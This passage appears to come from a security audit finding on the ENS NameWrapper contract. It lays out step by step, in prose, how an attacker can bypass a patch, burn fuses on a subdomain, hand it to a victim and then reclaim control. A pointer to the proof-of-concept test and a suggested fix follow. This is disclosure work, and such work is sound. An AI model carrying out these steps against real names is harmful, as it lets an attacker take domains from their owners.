+ wait for the expiry of `sub1.eth` and re-register the registrar owner (i.e., the ERC721 owner) as the hacker himself (i.e., wait for expiry and re-register from old controller contract to the hacker himself)

+ set the registry owner (i.e., `ens.owner`) of `sub1.eth` as the hacker himself.

+ set the registrar owner (i.e., the ERC721 owner) as the NameWrapper contract. _This is to bypass the new-added patch_

+ leverage `setChildFuses` to burn the `PARENT_CANNOT_CONTROL` fuse  of `sub2.sub1.eth` 

+ transfer the wrapped token of `sub2.sub1.eth` to the victim user

+ HACK: reset  the registry owner (i.e., `ens.owenr`) of `sub2.sub1.eth` as the hacker

+ HACK: wrap `sub2.sub1.eth`

### Impact

Same as __H-02__, the vulnerability can induce an  implied unwrapping, which breaks the guarantees of `PARENT_CANNOT_CONTROL` and `CANNOT_CREATE_SUBDOMAIN`

### Proof of Concept

*(Note: see [warden's original submission](https://github.com/code-423n4/2022-12-ens-mitigation-findings/issues/12) for full PoC and test)*

Put `poc_mitigation.js` to `test/wrapper/` and run `npx hardhat test test/wrapper/poc_mitigation.js`.

All mitigation PRs mentioned in https://github.com/code-423n4/2022-12-ens-mitigation#scope are affected.

### Recommended Mitigation Steps

Maybe add the check of registry owners will help mitigate the issue, which currently looks like a valid patch.
